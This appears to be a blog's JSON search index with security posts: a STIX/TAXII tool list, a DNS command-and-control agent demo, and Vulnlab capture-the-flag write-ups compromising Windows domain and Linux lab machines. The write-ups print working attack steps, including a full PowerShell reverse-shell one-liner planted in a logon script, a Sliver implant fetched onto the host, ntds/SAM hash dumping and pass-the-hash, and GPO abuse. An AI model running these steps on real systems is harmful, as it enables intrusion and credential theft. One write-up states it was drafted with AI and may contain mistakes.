data.\nResource URL Description Data Type AlienVault OTX https://otx.alienvault.com/api Requires an account, provides data in various ways including a TAXII Server. STIX 1.x Threat Connect https://threatconnect.com/stix-taxii/ Requires an account, Paid service, (consumes and provides) threat intel. STIX 1.x/2.x EcleticIQ https://www.taxiistand.com/ Test TAXII (v1x) server. (quite unstable and inconsistent) STIX 1.x Limo - Anomali https://www.anomali.com/resources/limo Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests. STIX 1.x/2.x Tools for STIX/TAXII The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that\u0026rsquo;s the most common one.\nOther tools that might come in handy.\nTool Description Version stix-shifter Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others STIX 1.x/2.x stix2 The main python package to parse and use/create STIX2 data. STIX 2.x stix2-validator Provides a validation for the STIX2 data, can be used to validate your data from your sources. STIX 2.x stix2-slider Transforms STIX2 content to STIX1.2 STIX 2.x stix2-elevator Transforms STIX1 data to STIX2.x STIX 1.x stix The main python package for STIX1 data. STIX 1.x stix-validator Validating STIX1 data. STIX 1.x stix2-patterns Validator and Pattern Parser for STIX 2.x Patterns STIX 2.x taxii2-client Python Client for TAXII 2 Servers TAXII 2.x cabby Python Client for TAXII 1 Servers TAXII 1.x Snippets and Gists https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d (Creating a TAXII2 Client for LimoAnomali) https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858 (Creating a TAXII1 Client for OTXAlienVault) ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-04-10-stix-taxii-complete-knowledge\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-10-26-dns-c2-communcation\/": {
        "title": "Using DNS as C2 Communication - Evasive Techniques (Part 3)",
        "tags": [],
        "content": "Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP. The A Record looks like this:\n{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME} I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.\nWhy DNS and not {arbitrary protocol}? DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.\nBypassing security products via DNS data exfiltration Implementation I will explain it briefly from the agent\u0026rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a TXT Record (containing a command such as ls) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.\nNote: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. More info After the server receives a request with the packet number and the total number of packets (that\u0026rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the {HEX_ENCODED_PAYLOAD} part of the message).\nCode / Demo Repository - The repository is created for a starting point to improve/build upon.\nThe repository contains both the agent and the server. When the server is being ran it sets the default handler dns.HandleFunc(\u0026quot;.\u0026quot;, AgentHandler) to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.\nUsage Start the server $ go run main.go 127.0.0.1:8053 Start the agent $ go run ./agent/main.go Execute commands on the server side shell (In the case below simple dir). Note that I type cmd /C dir - Why? \u0026gt;\u0026lt;((((\u0026gt; dns c2 by syl \u0026lt;))))\u0026gt;\u0026lt; dnsc2\u0026gt; cmd /C dir Volume in drive C is OS Volume Serial Number is XXXX-XXXX Directory of C:\\code\\dnsc2\\agent 10/28/2022 08:40 PM \u0026lt;DIR\u0026gt; . 10/29/2022 11:03 PM \u0026lt;DIR\u0026gt; .. 10/28/2022 08:40 PM 481 go.mod 10/28/2022 08:40 PM 3,755 go.sum 10/30/2022 12:37 PM 1,762 main.go 3 File(s) 5,998 bytes 2 Dir(s) 107,561,959,424 bytes free Conclusion Please note that there could be some easier ways to do this, and some information can be wrong I did my best to research everything that I post here, if you find an error or if you think that something can be improved somewhere you can drop me a message!\nResources https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat https://stackoverflow.com/a/28918017 https://www.cloudflare.com/learning/dns/what-is-dns/ https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/ ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-10-26-dns-c2-communcation\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-18-vulnlab-baby\/": {
        "title": "Vulnlab - Baby [Easy]",
        "tags": [],
        "content": "Recently I\u0026rsquo;ve started to explore more platforms for hacking different type of boxes and I found that xct has created vulnlab. From what I\u0026rsquo;ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the \u0026ldquo;Baby\u0026rdquo; lab.\nhttps://www.vulnlab.com/ User / Initial Foothold Started with a nmap scan:\nsylsec$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN nmap.txt -sC -sV $ip -Pn PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 49664/tcp open msrpc Microsoft Windows RPC 49675/tcp open msrpc Microsoft Windows RPC 59647/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=657F4FC2%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows We can clearly see that this is a Windows machine that is also a part of Active Directory. The domain seems to be baby.vl, I will add this to my /etc/hosts file. After that, I ran enum4linux.\n(I will post only the interesting results)\nsylsec$ enum4linux $ip ... [*] Trying LDAP [+] Appears to be root/parent DC [+] Long domain name is: baby.vl ... [+] Found domain information via SMB NetBIOS computer name: BABYDC NetBIOS domain name: BABY DNS domain: baby.vl FQDN: BabyDC.baby.vl Derived membership: domain member Derived domain: BABY ... Server allows session using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; ... [+] Domain: BABY [+] Domain SID: S-1-5-21-1407081343-4001094062-1444647654 [+] Membership: domain member ... OS: Windows 10, Windows Server 2019, Windows Server 2016 OS version: \u0026#39;10.0\u0026#39; OS release: \u0026#39;\u0026#39; OS build: \u0026#39;20348\u0026#39; ... This scan yieled some useful results like the computer name and some information about the system, usually I would try enumerate some more with ldapsearch.\nsylsec$ ldapsearch -LLL -x -H ldap://$ip -b \u0026#39;\u0026#39; -s base \u0026#39;(objectclass=*)\u0026#39; ... rootDomainNamingContext: DC=baby,DC=vl ldapServiceName: baby.vl:babydc$@BABY.VL This didn\u0026rsquo;t yield that much information but we can search for the specific domain components (baby,vl)\n(Only the interesting information)\nsylsec$ ldapsearch -x -H ldap://$ip -D \u0026#39;\u0026#39; -w \u0026#39;\u0026#39; -b \u0026#34;DC=baby,DC=vl\u0026#34; ... # Teresa Bell, it, baby.vl dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user cn: Teresa Bell sn: Bell description: Set initial password to BabyStart123! ... \u0026lt;other users\u0026gt; Now we\u0026rsquo;ve learned that the initial password for the users is BabyStart123!, we can save all the found users under users.txt and try the password against all of them with netexec (previously CrackMapExec).\nsylsec$ netexec smb $ip -u ./users.txt -p ./passwords.txt SMB 10.10.83.68 445 BABYDC [*] Windows 10.0 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) ... SMB 10.10.10.6 445 BABYDC [-] baby.vl\\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE ... We found that the user caroline.robinson has the status STATUS_PASSWORD_MUST_CHANGE, we can use smbpasswd.py from the impacket scripts to change the password.\nsylsec$ python3 smbpasswd.py baby.vl/Caroline.Robinson:\u0026#39;BabyStart123!\u0026#39;@$ip -newpass Summer2018! [!] Password is expired, trying to bind with a null session. [*] Password was changed successfully. Now, let\u0026rsquo;s try to use WinRM to log in to the machine.\nsylsec$ evil-winrm -i $ip -u Caroline.Robinson -p \u0026#39;Summer2018!\u0026#39; *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u0026gt; *Evil-WinRM* PS C:\\Users\\Caroline.Robinson\\Documents\u0026gt; type ..\\Desktop\\user.txt VL{\u0026lt;hash\u0026gt;} Root / Privilege Escalation Since I highly dislike evil-winrm due to its instability (atleast on my machine) and the fact that the machine has an active defender which will flag most of the binaries that I will try to put for further enumeration as malicious, I decided to spin up SilverC2 .\nsylsec$ silversrv ██████ ██▓ ██▓ ██▒ █▓▓█████ ██▀███ ▒██ ▒ ▓██▒ ▓██▒▓██░ █▒▓█ ▀ ▓██ ▒ ██▒ ░ ▓██▄ ▒██░ ▒██▒ ▓██ █▒░▒███ ▓██ ░▄█ ▒ ▒ ██▒▒██░ ░██░ ▒██ █░░▒▓█ ▄ ▒██▀▀█▄ ▒██████▒▒░██████▒░██░ ▒▀█░ ░▒████▒░██▓ ▒██▒ ▒ ▒▓▒ ▒ ░░ ▒░▓ ░░▓ ░ ▐░ ░░ ▒░ ░░ ▒▓ ░▒▓░ ░ ░▒ ░ ░░ ░ ▒ ░ ▒ ░ ░ ░░ ░ ░ ░ ░▒ ░ ▒░ ░ ░ ░ ░ ░ ▒ ░ ░░ ░ ░░ ░ ░ ░ ░ ░ ░ ░ ░ ░ All hackers gain fear [*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b [*] Welcome to the sliver shell, please type \u0026#39;help\u0026#39; for options [*] Check for updates with the \u0026#39;update\u0026#39; command [server] sliver \u0026gt; generate --mtls tun0:8888 [*] Generating new windows/amd64 implant binary [*] Symbol obfuscation is enabled [*] Build completed in 39s [*] Implant saved to /home/syl/vulnlab/Baby/EXISTING_CROTCH.exe Now, that I have an implant, I\u0026rsquo;ve transferred it to the server with Invoke-WebRequest.\n*Evil-WinRM* PS C:\\Windows\\TEMP\u0026gt; iwr http://\u0026lt;myIp\u0026gt;:8000/EXISTING_CROTCH.exe -OutFile EXISTING_CROTCH.exe *Evil-WinRM* PS C:\\Windows\\TEMP\u0026gt; .\\EXISTING_CROTCH.exe I\u0026rsquo;ve set up a listener and once I invoke the implant on the machine I will get a session on my server.\n[*] Session b7e812e4 EXISTING_CROTCH - 10.10.83.8:52141 (BabyDC) - windows/amd64 - Mon, 18 Dec 2023 09:57:19 EET Then I\u0026rsquo;ve started to enumerate the privileges first.\n[server] sliver (EXISTING_CROTCH) \u0026gt; getprivs Privilege Information for EXISTING_CROTCH.exe (PID: 3248) --------------------------------------------------------- Process Integrity Level: High Name Description Attributes ==== =========== ========== SeMachineAccountPrivilege Add workstations to domain Enabled, Enabled by Default SeBackupPrivilege Back up files and directories Enabled, Enabled by Default SeRestorePrivilege Restore files and directories Enabled, Enabled by Default SeShutdownPrivilege Shut down the system Enabled, Enabled by Default SeChangeNotifyPrivilege Bypass traverse checking Enabled, Enabled by Default SeIncreaseWorkingSetPrivilege Increase a process working set Enabled, Enabled by Default And I noticed that we have the SeBackupPrivilege and SeRestorePrivilege privilege enabled, that automatically means that we can abuse those to get the ntds.dit,SAM,SYSTEM files to obtain some hashes that we can use further to escalate our privileges.\nThere are a lot of resources for this technique, here are some of my favorite reads:\nhttps://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ I created a file on my local system called syl.dsh which is basically a script file that can execute series of commands, the contents is as follows:\nset context persistent nowriters add volume c: alias syl create expose %syl% z: This sets the context to be persistent, so that the shadow copies will be kept after the diskshadow session is closed. Then we add a shadowcopy of the C:\\ drive with the alias syl, we create it and we expose it as another drive Z:\nThen we can download the shadow copy of the ntds file using the SilverC2\u0026rsquo;s interactive mode.\n[server] sliver (EXISTING_CROTCH) \u0026gt; download Z:\\Windows\\ntds And we also need the SYSTEM and SAM files, which we can get by invoking the reg utility.\n[server] sliver (EXISTING_CROTCH) \u0026gt; reg save hklm\\sam c:\\Temp\\sam [server] sliver (EXISTING_CROTCH) \u0026gt; reg save hklm\\system c:\\Temp\\system ... [server] sliver (EXISTING_CROTCH) \u0026gt; download system [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/system [server] sliver (EXISTING_CROTCH) \u0026gt; download SAM [*] Wrote 16842752 bytes (1 file successfully, 0 files unsuccessfully) to /home/syl/vulnlab/Baby/SAM Now we can extract the hashes with impacket-secretsdump\nsylsec$ python3 secretsdump.py -system /home/syl/vulnlab/Baby/exfiltrated/system -sam /home/syl/vulnlab/Baby/exfiltrated/SAM -ntds /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL ... Administrator:500:aad3b435b51404eeaad3b435b51404ee:\u0026lt;HASH\u0026gt;::: ... And once we\u0026rsquo;ve extracted the hash, we can log in to the DC using WinRM.\nsylsec$ evil-winrm -i $ip -u Administrator -H $hash *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; type root.txt VL{\u0026lt;hash\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-18-vulnlab-baby\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-31-vulnlab-baby2\/": {
        "title": "Vulnlab - Baby2 [Medium]",
        "tags": [],
        "content": " Name OS Difficulty Baby2 Windows Medium Summary We will be exploring some SMB shares where we would find some folders of the users and a shortcut that is going to hint of a logon script that gets executed every time a user logs in. Then we are going to exploit some weak credentials and find a writable share that we can use to modify the login VBS script, that would give us the initial shell. Then we are going to exploit some WriteDACL permissions to gain GenericAll permission on our account over a targeted account, which we can use to change the password of that account. After that, this account would have GenericAll permissions over the DDP (Default Domain Policy) and we can leverage that by creating a Scheduled Task that will execute immediately to add our controlled account to the local administrators, with that we can log in with that account, and we will be a local administrator on that machine.\nInitial Foothold We are going to start with an TCP/UDP scan:\n$ sudo nmap -sS -sU 10.10.101.112 --min-rate 10000 Let\u0026rsquo;s start enumerating the surface, since that we have an SMB protocol we can start with it.\nLet\u0026rsquo;s try NULL session first:\nWe cannot list any shares using the null session, so let\u0026rsquo;s move on and try with a random username:\n$ netexec smb 10.10.101.112 -u \u0026#39;sfgsfgsf\u0026#39; -p \u0026#39;\u0026#39; --shares We successfully listed a few shares, we won\u0026rsquo;t go into the default ones, let\u0026rsquo;s see what is in the */apps and /homes:\nWe got a few files, CHANGELOG and login.vbs.lnk which is a Windows Shortcut format, from the CHANGELOG file we understood that some drive mapping is happening and from the login shortcut we can extract the following useful information using lnkinfo:\n$ lnkinfo login.vbs.lnk Local path : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Network path : \\\\DC\\NETLOGON\\login.vbs Relative path : ..\\..\\..\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs Working directory : C:\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts There is a VBS file in the SYSVOL share that we are still unsure what it does, however with the information that we have we can OSINT a bit to understand what are those files.\nWe will find this question in serverfault, which is related to a network drive mapping and some logon scripts. We can conclude that some script is firing up whenever we log in as a user, this will become useful later, so let\u0026rsquo;s note that and move on.\nNext, lets explore the /homes share.\n$ smbclient //10.10.101.112/homes -U \u0026#39;sfgsfgsf\u0026#39; This would give us a list of usernames that are most likely related to the Active Directory. Let\u0026rsquo;s save those in a file and try them against the SMB protocol, for the password we would try to exploit some weak credentials.\n$ netexec smb 10.10.101.112 -u ./credentials/users.txt -p ./credentials/users.txt We would find that we can log in as Carl.Moore since we got a git for his username used as a password.\nLet\u0026rsquo;s list the shares once more, we may have different shares that we can read.\n$ netexec smb baby2.vl -u \u0026#39;Carl.Moore\u0026#39; -p \u0026#39;Carl.Moore\u0026#39; --shares SMB 10.10.101.112 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:baby2.vl) SMB 10.10.101.112 445 DC [+] baby2.vl\\Carl.Moore:Carl.Moore SMB 10.10.101.112 445 DC [*] Enumerated shares SMB 10.10.101.112 445 DC Share Permissions Remark SMB 10.10.101.112 445 DC ----- ----------- ------ SMB 10.10.101.112 445 DC ADMIN$ Remote Admin SMB 10.10.101.112 445 DC apps READ,WRITE SMB 10.10.101.112 445 DC C$ Default share SMB 10.10.101.112 445 DC docs READ,WRITE SMB 10.10.101.112 445 DC homes READ,WRITE SMB 10.10.101.112 445 DC IPC$ READ Remote IPC SMB 10.10.101.112 445 DC NETLOGON READ Logon server share SMB 10.10.101.112 445 DC SYSVOL READ Logon server share We can now read the /docs and our other point of interest, which is the SYSVOL share. The /docs share was empty so lets look at the VBS script that is located in the SYSVOL share.\nSub MapNetworkShare(sharePath, driveLetter) Dim objNetwork Set objNetwork = CreateObject(\u0026#34;WScript.Network\u0026#34;) \u0026#39; Check if the drive is already mapped Dim mappedDrives Set mappedDrives = objNetwork.EnumNetworkDrives Dim isMapped isMapped = False For i = 0 To mappedDrives.Count - 1 Step 2 If UCase(mappedDrives.Item(i)) = UCase(driveLetter \u0026amp; \u0026#34;:\u0026#34;) Then isMapped = True Exit For End If Next If isMapped Then objNetwork.RemoveNetworkDrive driveLetter \u0026amp; \u0026#34;:\u0026#34;, True, True End If objNetwork.MapNetworkDrive driveLetter \u0026amp; \u0026#34;:\u0026#34;, sharePath If Err.Number = 0 Then WScript.Echo \u0026#34;Mapped \u0026#34; \u0026amp; driveLetter \u0026amp; \u0026#34;: to \u0026#34; \u0026amp; sharePath Else WScript.Echo \u0026#34;Failed to map \u0026#34; \u0026amp; driveLetter \u0026amp; \u0026#34;: \u0026#34; \u0026amp; Err.Description End If Set objNetwork = Nothing End Sub MapNetworkShare \u0026#34;\\\\dc.baby2.vl\\apps\u0026#34;, \u0026#34;V\u0026#34; MapNetworkShare \u0026#34;\\\\dc.baby2.vl\\docs\u0026#34;, \u0026#34;L\u0026#34; We found the script, that is hinting the same thing that we found in the question above, it is mapping the domain shares as disk drives, nothing else useful can be derived from that. However, one thing that netexec isn\u0026rsquo;t showing (or perhaps it shows wrong) is that we can actually modify this file.\n$ smbcacls //10.10.101.112/SYSVOL /baby2.vl/scripts/login.vbs -U \u0026#39;Carl.Moore%Carl.Moore\u0026#39; REVISION:1 CONTROL:SR|DI|DP OWNER:BUILTIN\\Administrators GROUP baby2.vl\\Domain Users ACL:BUILTIN\\Administrators:ALLOWED/I/FULL ACL:NT AUTHORITY\\Authenticated Users:ALLOWED/I/FULL ACL:Everyone:ALLOWED/I/FULL \u0026lt;--------------- ACL:NT AUTHORITY\\SYSTEM:ALLOWED/I/FULL ACL:BUILTIN\\Server Operators:ALLOWED/I/READ We can see that we can actually control the file: ACL:Everyone:ALLOWED/I/FULL\nSo let\u0026rsquo;s modify the file to get us the initial foothold by spawning a PowerShell reverse shell.\ncreateobject(\u0026#34;wscript.shell\u0026#34;).run\u0026#34;cmd.exe /c powershell \u0026#34;\u0026#34;$client=New-Object System.Net.Sockets.TCPClient(\u0026#39;10.8.0.107\u0026#39;,9192);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String);$sendback2=$sendback+\u0026#39;PS \u0026#39;+(pwd).Path+\u0026#39;\u0026gt; \u0026#39;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34;,0 We spawned a shell which belongs to Amelia.Griffiths, we can now read the user flag.\nPrivilege Escalation For this part, we must enumerate the environment first, so let\u0026rsquo;s use python\u0026rsquo;s version of bloodhound.\n$ bloodhoundpy -c All -d baby2.vl -dc dc.baby2.vl -u Carl.Moore -p \u0026#39;Carl.Moore\u0026#39; -ns 10.10.101.112 And after we gather all the stuff and load them into bloodhound, we can see what permission does our owned user\nAmelia.Griffiths Is a member of a group called LEGACY which has WriteDacl permissions over the GPOADM user of the domain, in that case let\u0026rsquo;s use those techniques:\nGrant Rights ForceChangePassword . Transfer the PowerView to the machine and then:\nPS \u0026gt; . .\\PowerView.ps1 PS \u0026gt; Add-DomainObjectAcl -Rights \u0026#39;All\u0026#39; -TargetIdentity \u0026#34;GPOADM\u0026#34; -PrincipalIdentity \u0026#34;Amelia.Griffiths\u0026#34; We are granting GenericALL over the user GPOADM and then we can use the second technique:\nPS \u0026gt; $UserPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force PS \u0026gt; Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword Then we can try if that worked:\nWe can try using evil-winrm to log in, but that won\u0026rsquo;t work just yet, just because if we list the local accounts on the machine we don\u0026rsquo;t actually have the gpoadm user there, so we must add it first. In order to that, we must abuse the GPO rights, using the **Immediate Scheduled Task technique.\nLet\u0026rsquo;s figure out first the GPOs that we can abuse, we can either look that up in the bloodhound or by using the gpoowned tool.\nThen we can craft our command to abuse the scheduled tasks\n$ pygpoabuse baby2.vl/gpoadm:\u0026#39;Password123!\u0026#39; -gpo-id \u0026#39;31B2F340-016D-11D2-945F-00C04FB984F9\u0026#39; -dc-ip 10.10.78.135 -v -command \u0026#39;net localgroup administrators GPOADM /add\u0026#39; And we should be able to log in as the user gpoadm using evil-winrm\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-31-vulnlab-baby2\/"
    },
    
    "http:\/\/localhost:1313\/posts\/vulnlab-control-chain\/": {
        "title": "Vulnlab - Control (Chain)",
        "tags": [],
        "content": " This is an experimental write-up that I did with AI, I trying to proof-read them as well as I can, but apologies if there are misstakes.\nIn this challenge, we are presented with two target machines, each offering a different attack surface. The journey begins with a reconnaissance phase, identifying open ports and services through scanning.\nInitial Scanning and Discovery For the intra machine, the open ports discovered were:\n22/tcp for SSH 443/tcp for HTTPS On the os machine, the ports identified were:\n22/tcp for SSH 80/tcp for HTTP 443/tcp for HTTPS 8443/tcp 8444/tcp Gaining Initial Access Exploring the os machine\u0026rsquo;s HTTPS service on port 443 led us to a wiki page hinting at the use of pydio and osctrl services. Within this page, we found some valuable information, including a potential default password Sum\u0026lt;redacted\u0026gt; and a list of user accounts:\nJimmy George - j.george Ann Rodriguez - a.rodriguez Adriana Larose - a.larose Kara Leblanc - k.leblanc Steven Thibodeau - s.thibodeau Kurt Dagenais - k.dagenais Ken Pare - k.pare Yvon McBride - y.mcbride We extracted those users, from the revisions of each page.\nUtilizing the discovered password, we were able to authenticate as users y.mcbride and k.dagenais in the pydio.\nCVE 2023-32749 Leveraging CVE 2023-32749, detailed at Exploit Database , we escalated privileges by assigning an admin role to a newly created user. This vulnerability allows attackers to modify user roles, thus granting unauthorized access to sensitive cells within the application.\nExtracting Sensitive Information Within the administrative area, we intercepted a conversation mentioning the creation of a provision user with the password TeiG6im\u0026lt;redacted\u0026gt; for testing purposes on the os.control.vl server. This information provided SSH access as the provision user, from which we extracted the .ssh folder for future use.\nPyio\u0026rsquo;s Chat @Kara: I added this room to share scripts, outputs, documents for our osquery project and already added some documents. Also, as discussed I created the provision user on `os.control.vl` with password `TeiG6imee\u0026lt;redacted\u0026gt;` so we can start using your temporary provisioning solution on the first servers for testing. Database Access and Further Privilege Escalation On the same machine, a PostgreSQL database was found listening on port 5432. Accessing the database using the default postgres user revealed the osctrl database. Within this database, we targeted the admin_users table to replace the bcrypt password hash of the admin user with a known hash for the password admin, facilitating web system login.\nUPDATE admin_users SET pass_hash = \u0026#39;$2a$10$3.g.9xQtpwNpOxYsEXZX...xxMJcttMqcCw5i3imHBGJ6VJfFw41W\u0026#39; WHERE id = 1; Final Stages of System Compromise The osctrl system can be used to run arbitrary osquery queries towards the enrolled nodes, with the following query we can list files in a given directory, this is going to be useful for enumerating files in the machine.\nSELECT * FROM file WHERE path = \u0026#39;/given/path\u0026#39;; The osctrl system allowed file extraction from enrolled nodes this feature is called \u0026ldquo;craving file\u0026rdquo;. Exploiting this feature, we extracted the .ssh folder of the user kara, which contained SSH keys. These keys provided access to the kara account, which had sudo privileges, allowing us to switch to the root user.\nInfiltrating the Intra Machine Investigation on the intra machine revealed that the root user\u0026rsquo;s authorized_keys contained the provision user\u0026rsquo;s private key.\nThe authorized_key however can be run with only a few commands, stated in the command script in the authorized_keys.\n#!/usr/bin/bash # (c) 2022-2023 by Kara Leblanc # # This is a temporary server provision wrapper for control.vl unix servers. # # For security reasons the provisioning ssh key is only allowed to run # this script and not all commands on the machine. # This script will only allow to run commands that are contained in special # modules in the modules/ directory. Despite being highly secure there are # probably better solutions to our problem but we need to evaluate them. We # will therefore stick with this script for now. set -- $SSH_ORIGINAL_COMMAND if [[ -n $1 ]] ; then module=$(basename ${1}) shift if [[ -f /opt/provision/modules/$module \u0026amp;\u0026amp; -x /opt/provision/modules/$module ]] ; then exec \u0026#34;/opt/provision/modules/$module\u0026#34; \u0026#34;$@\u0026#34; fi fi The executable commands are:\nprov_osqd prov_df prov_uname Among the executable commands, prov_osqd stood out. This script, intended for enrolling systems, could be abused to execute a reverse shell by intercepting the curl request for enroll.sh and replacing it with a malicious script.\nprov_osqd script #!/usr/bin/bash if [[ -z $1 || -z $2 ]] ; then echo \u0026#34;Missing options.\u0026#34; \u0026gt;\u0026amp;2 exit 42 curl -sk https://os.control.vl/${1}/${2}/enroll.sh | bash Exploitation Summary To exploit prov_osqd, the following steps were executed:\nStopped the nginx service on the os machine. Modified the nginx configuration to proxy traffic to a local Python server on port 8000. Created nested folders on the Python server to mimic the expected path and placed a malicious enroll.sh script containing a reverse shell. Triggered prov_osqd with arbitrary arguments, resulting in the execution of the reverse shell script. This comprehensive approach allowed us to gain root privileges on the intra system.\n", 
        "url": "http:\/\/localhost:1313\/posts\/vulnlab-control-chain\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-feedback\/": {
        "title": "Vulnlab - Feedback [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Feedback Linux Easy Summary We would find an Apache Tomcat server running, where we can fuzz it to find an endpoint called /feedback which then we can exploit a vulnerability in Apache Struts for gaining our initial foothold. Then we would find clear-text credentials while analyzing the Apache Tomcat\u0026rsquo;s files which will give us the root access.\nInitial Foothold We would start with a nmap scan:\nsyl@sylsec:~/vulnlab/Feedback$ sudo nmap -sS -sU 10.10.80.221 --min-rate 10000 --open -p- [sudo] password for syl: Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-26 16:40 EET Warning: 10.10.80.221 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.80.221 Host is up (0.17s latency). Not shown: 65456 open|filtered ports, 52483 closed ports, 13129 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Which would give us the SSH service and some kind of HTTP website, upon visiting the website we would find that this is the default installation for Apache Tomcat. We have free access to the examples of the Apache Tomcat, but not to the /manager.\nThis initially made me think that we would have something to do with the sessions because we can edit it, so I went to fuzz the website further.\nWe can fuzz the website for any additional directories:\nsyl@sylsec:~/tools$ ffuf -w $commontxt -u http://10.10.80.221:8080/FUZZ /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : GET :: URL : http://10.10.80.221:8080/FUZZ :: Wordlist : FUZZ: /home/syl/tools/lists/SecLists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ docs [Status: 302, Size: 0, Words: 1, Lines: 1] examples [Status: 302, Size: 0, Words: 1, Lines: 1] feedback [Status: 302, Size: 0, Words: 1, Lines: 1] favicon.ico [Status: 200, Size: 21588, Words: 19, Lines: 22] host-manager [Status: 302, Size: 0, Words: 1, Lines: 1] manager [Status: 302, Size: 0, Words: 1, Lines: 1] As we can see, we have the /feedback route, that consisted of two input fields, one for the name and one for the feedback.\n![[Pasted image 20231226190051.png]]\nWe can inspect the source code of the page and there we can find this HTML comment:\n\u0026lt;!-- Build with Java, Struts2 \u0026amp; Log4J --\u0026gt; We would then use Google to find some exploit related to those technologies, and we would find 